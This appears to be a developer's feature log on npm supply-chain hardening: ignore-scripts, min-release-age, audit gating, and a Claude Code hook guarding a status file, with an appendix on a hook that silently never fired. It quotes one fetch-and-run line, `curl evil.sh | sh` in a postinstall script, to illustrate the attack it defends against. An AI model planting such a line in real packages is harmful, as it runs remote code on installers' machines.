# Feature 0.5 — Supply chain hardening (npm hygiene + Claude Code hooks)

**Feature ID:** `supply-chain-hardening` (from `feature_list.json`)

**Status:** done

---

## What we built

The dependency surface for the frontend is no longer trust-based. A
project-level `.npmrc` disables install scripts globally, freezes the
Node/npm floor, and quarantines packages newer than seven days; `init.sh`
materialises the single legitimate exception (`esbuild`) by an explicit
rebuild and then fails the build on any `npm audit` finding at moderate
severity or higher; and a Claude Code `PreToolUse` hook blocks agents
from editing `feature_list.json` or `package-lock.json` out of band.
Dependabot is configured to keep the floor moving with weekly grouped
PRs for dev dependencies and immediate PRs for security advisories.

## TS / React concepts that appear

This feature is harness-level — there is no React code in the diff —
so the concepts below are the npm / Vite / tooling mechanics that
make the policy work.

- **npm lockfile integrity (`package-lock.json` → `integrity:` field).**
  Every entry carries a SHA-512 of the tarball npm served at install
  time, and `npm ci` refuses to proceed on mismatch. This is what
  reproducibility actually means in npm. What it does **not** mean:
  that the contents of the tarballs are benign — a compromised
  maintainer can publish a malicious version that npm cheerfully
  hashes and serves. The lockfile is a contract about _what bytes_ we
  agreed to install, not about _who they came from_. See
  [`npm docs — package-lock.json`](https://docs.npmjs.com/cli/v11/configuring-npm/package-lock-json).
- **The `postinstall` lifecycle hook.** A field in a package's
  `package.json` that npm executes after that package lands in
  `node_modules`. Originally for native builds (the
  `node-gyp ./build` era) and binary downloads (`esbuild`); now also
  the modern supply-chain attack surface (compromised maintainer
  account → `postinstall: "curl evil.sh | sh"`). The `ignore-scripts`
  npm config flag disables all three lifecycle hooks (`preinstall`,
  `install`, `postinstall`) project-wide. Documented in
  [`npm docs — scripts`](https://docs.npmjs.com/cli/v11/using-npm/scripts).
- **`overrides` in `package.json`.** npm 8.3+ feature for forcing the
  resolution of a transitive dependency without forking it or
  declaring it at the top level. We use it (in this feature) to pin
  `esbuild` to `>=0.25.0` and `ws` to `>=8.20.1` so the vulnerable
  ranges of those transitives never appear in the lockfile. The
  alternative — patching the intermediate consumer — does not scale.
  Documented in
  [`npm docs — overrides`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#overrides).
- **`min-release-age` (npm 11.7+).** Refuses to install any version of
  any package published less than the given number of days ago. The
  value is in days as a Number; `7` filters out anything less than a
  week old. This is the single largest defense against the
  "compromised account publishes a patch version" attack — those
  publications are usually pulled within 24-48 hours of detection,
  long before the seven-day window elapses. The setting's existence
  is why the engines floor is `npm >= 11.7` (older npm silently
  ignores the option and the defense is missing without a warning).
- **Vite 7 major upgrade.** Not strictly a concept, but a
  consequence: the only fix path for advisory
  [GHSA-4w7w-66w2-5vf9](https://github.com/advisories/GHSA-4w7w-66w2-5vf9)
  was `vite >= 7.3.2`, since the patch was not backported to 5.x or
  6.x. Vite 7 builds the project unchanged (TypeScript bundle is
  byte-equivalent for our config), so the upgrade carries the
  security fix without a UX change. The implication for later
  features is that we are now on the same major as upstream.

## Decisions taken

- **Decision:** disable install scripts by default and re-enable
  them per-package via `npm rebuild` in `init.sh`.
  **Alternatives considered:** (a) leave scripts enabled and trust
  the registry; (b) install a third-party tool like `pnpm` with its
  side-effect manifest; (c) self-host a verdaccio mirror.
  **Why this one:** option (a) is the status quo and offers no
  defense against the dominant attack vector. Option (b) means a
  toolchain migration the project does not need. Option (c) requires
  infrastructure we will not staff. The `ignore-scripts=true` +
  explicit allowlist via `npm rebuild` is the maximum hardening we
  can run with zero new infrastructure, and it makes "we added a
  package that needs a postinstall" loud rather than silent.

- **Decision:** fail the build on `npm audit --audit-level=moderate`
  instead of low or high.
  **Alternatives considered:** (a) `high` only — easier to keep
  green; (b) `low` — strictest, but most low findings are ReDoS in
  build-time tooling that never runs against user input.
  **Why this one:** moderate is the user-confirmed threshold per the
  plan. Most of the npm advisories we are seeing in 2024-2026 land
  at moderate (ReDoS, prototype pollution, denial-of-service in
  internal tooling). Failing at moderate makes us address them at
  publication time rather than letting them accumulate to the next
  audit run.

- **Decision:** bump Vite from `^5.4.8` to `^7.3.2` as part of this
  feature.
  **Alternatives considered:** (a) keep Vite 5 and document the
  unfixable advisory as accepted risk; (b) stay on Vite 5 by adding
  Vite to `overrides` with `>=7.3.2` (which npm refuses for direct
  dependencies anyway); (c) pin Vite to 6.4.2 if that fixes the
  CVE.
  **Why this one:** the advisory is unfixed below 7.3.2; the audit
  gate would never pass. The plan authorises `overrides` for
  transitive pins but explicitly calls for `npm audit
--audit-level=moderate` to exit 0. A direct major upgrade is the
  only consistent resolution. The build is unchanged after the
  upgrade.

- **Decision:** group dev dependencies in Dependabot, leave
  production dependencies individual.
  **Alternatives considered:** group everything; group nothing;
  group by ecosystem.
  **Why this one:** dev dependencies churn often and rarely break
  user-visible behaviour; a single weekly PR is easier to review
  than ten. Production dependencies (React, MUI, etc.) are
  load-bearing and benefit from individual review even when the
  change is a patch.

## How this compares to what I know

- **In Maven this would be...** the OWASP Dependency-Check plugin
  plus `mvn versions:display-dependency-updates`, except Maven has
  no equivalent of `postinstall`: dependency JARs are pure artefacts
  and the build tool runs them only when you call them. The npm
  `postinstall` surface does not exist in Maven, which is why
  Java's threat model is "vulnerable code at runtime" while npm's
  is "arbitrary code at install time". The mitigations are
  asymmetric: Maven gets away with hash-only integrity; npm has to
  also disable scripts.
- **In sbt this would be...** `addSbtPlugin` is the analogous attack
  surface — sbt plugins execute arbitrary code at build configuration
  time. The equivalent of `ignore-scripts=true` would be "never use
  plugins from outside our org", which is the actual policy at most
  Scala shops. Coursier (the underlying resolver) verifies SHA-1/-256
  hashes from the lockfile, mirroring what npm does with `integrity:`.
  No equivalent to `min-release-age`.
- **In Coursier this would be...** the closest analog is the
  `--mode=offline` flag (refuses to fetch new versions) and
  `coursier-credentials` (constrain resolution to trusted repos).
  Coursier's threat model assumes Maven Central is honest; npm's
  policy here is built on the assumption that the registry can serve
  a malicious version even when the registry itself is honest.
- **Compared to `IO` for sequencing effects:** `useEffect` is not
  involved here, but the npm install pipeline is itself effectful in
  a way Cats Effect would model with `Resource`: `npm ci` acquires
  files on disk, optionally runs scripts, optionally fetches binaries,
  and the cleanup is "delete `node_modules`". The `init.sh`
  orchestration is the equivalent of `Resource.make(install)(verify)
  > > rebuild >> audit >> build` — a sequenced effectful pipeline
  > > where each step gates the next.

## Gotchas / things I learned the hard way

- **`minimum-release-age` is not the npm config key.** Several
  external write-ups call the setting that, but `@npmcli/config`
  registers `min-release-age` (kebab-case, no "imum"). Using the
  wrong key gives a `npm warn Unknown project config` and no
  enforcement — the policy is silently disabled. Fixed by reading
  the npm CLI source.
- **`min-release-age` takes days as a Number, not a duration string.**
  `7d` is rejected by the loader; `7` is the value. The earlier
  guess of `604800` (seconds) was a long way off.
- **`overrides` cannot override a direct dependency.** npm errors with
  `EOVERRIDE` when you try to override a package you also declare in
  `dependencies` or `devDependencies`. Direct deps must be bumped at
  the declaration site (the Vite 7 upgrade above).
- **`npm audit fix` without `--force` will not bump major versions
  even when that is the only fix path.** Two of our six findings
  (`vite`/`esbuild`, `ws`/`socket.io-client`) required either a
  direct bump or an `overrides` entry. The `--force` flag would have
  installed `socket.io-client@4.2.0` from 2021 — that is the breaking
  change npm was warning about. Manual resolution was the only
  acceptable path.

## Post-close correction

This section is an appendix appended after the feature's first close
was retracted. The original "Decisions taken" and "What we built"
sections above are correct and unchanged; the bug was in
`.claude/settings.json`, specifically in the `PreToolUse` hook
command, and in the verification protocol that let it ship.

### What happened

The hook command shipped in the first pass read:

```bash
path="$CLAUDE_TOOL_INPUT_FILE_PATH"
if [[ "$path" == */feature_list.json ]]; then ... fi
```

`$CLAUDE_TOOL_INPUT_FILE_PATH` is **not** a Claude Code environment
variable. Claude Code does not pass tool input via environment
variables at all — it pipes a JSON object to the hook's stdin of the
shape `{"tool_input": {"file_path": "...", ...}}`. Under the real
runtime conditions, `$path` was always the empty string, neither
`if` branch ever matched, and every `Edit`/`Write` sailed through.
The "supply-chain-hardening" feature was technically incomplete from
the day it was marked `done`.

The failure surfaced when the leader subsequently `Edit`ed
`feature_list.json` to mark the next feature `in_progress` and the
operation succeeded silently — the exact behaviour the hook was
supposed to forbid.

### Why it shipped

The first-pass reviewer's hook verification was synthetic:

```bash
CLAUDE_TOOL_INPUT_FILE_PATH=/x/feature_list.json bash -c '<hook command>'
```

That test confirms the script's `if` logic is correct **assuming**
the precondition (`$CLAUDE_TOOL_INPUT_FILE_PATH` populated) holds.
The precondition itself was never validated. Nothing in the review
demonstrated that Claude Code actually populates that variable —
because it does not.

This is the classic "unit test passes, integration test would have
caught it" trap. Framed for the Scala/Typelevel + Node audience:

- In **tapir / http4s** terms, it is like writing a thorough test
  suite for a route handler — confirming it returns `200 OK` on a
  valid request, `400` on a malformed one, the right `Content-Type`
  headers, the right JSON shape — and then never actually plugging
  the handler into the router. The handler logic is correct under
  the assumption that the request reached it; the test fixture
  hand-builds the request and calls the handler directly. The router
  is part of the wiring, and the wiring was missing. A real HTTP
  smoke test against the running server would have caught it
  instantly.
- In **Cats Effect** terms, it is the difference between testing
  an `IO[Response]` value's logic in isolation and testing the
  `IOApp` that runs it inside `Resource.use`. The first kind of
  test gives you correctness conditional on the runtime; only the
  second gives you correctness of the runtime itself.
- In **Doobie** terms, it is testing an SQL fragment's shape with
  `Fragment#query[A].sql` versus actually running it against an
  in-memory H2. The shape can be right and the column names wrong;
  only the execution catches that.

The general rule, stated in npm-flavoured language: **a test that
mocks the precondition under test is not a test of the system, it is
a test of the mock.**

### The actual mechanism

Claude Code's `PreToolUse` hook contract, as documented in the
`anthropic-ai/claude-code` repo:

- Hooks receive the tool invocation as a JSON object piped to the
  hook process's stdin. The shape is `{"tool_name": "...",
"tool_input": {...}}`, where `tool_input` mirrors the tool's
  schema (so for `Edit` or `Write` it contains `file_path`,
  `old_string`, `new_string`, etc.).
- The hook returns a decision via its exit code:
  - `0` = allow the tool call to proceed.
  - `2` = **block** the tool call. stderr is surfaced to the model
    as the rejection reason.
  - other non-zero codes = error, treated as a malfunction.
- `jq -r '.tool_input.file_path // empty'` is the canonical parse.
  The `// empty` guard returns the empty string when the field is
  absent, so the script remains correct against future tool
  invocations that legitimately lack `file_path` (e.g.
  `NotebookEdit`).

The corrected hook in `.claude/settings.json` follows this contract
exactly: read stdin, parse with `jq`, branch on the suffix, exit 2
with a stderr message on a block, exit 0 otherwise.

### Workflow implication

Once the corrected hook is in place, the leader can no longer use
`Edit` or `Write` against `feature_list.json` — those calls are
refused at the harness level, not at the policy level. Status
rotation goes through `jq` invoked via the `Bash` tool, which is not
matched by the `Edit|Write` matcher. The canonical recipe is
documented in `.claude/agents/leader.md` under "Rotating feature
status".

This is a behavioural change for the leader role. The first pass
documented the _policy_ ("only the leader rotates status") and the
_enforcement_ ("the hook blocks edits"); the corrected pass
documents the _mechanism_ the leader uses to actually do the
rotation now that the enforcement works. All three were necessary
from the start; only the third was missing.

### The lesson

The reviewer role now requires a two-step hook verification:

1. **Bash logic check** with simulated stdin. Necessary; confirms
   the script does the right thing when invoked correctly. This was
   the only check in the first pass.
2. **End-to-end check** by triggering an actual Claude Code tool
   invocation that should be blocked. Sufficient; confirms the
   wiring. Without this, the hook script can be perfect and still
   never run.

Recipe lives in `.claude/agents/reviewer.md` under "Claude Code hook
verification". The recipe explicitly calls out the first-pass mistake
so it does not recur. Synthetic verification (setting environment
variables manually, hand-crafting stdin) is fine for narrowing down a
failing end-to-end test, but it can never substitute for one.
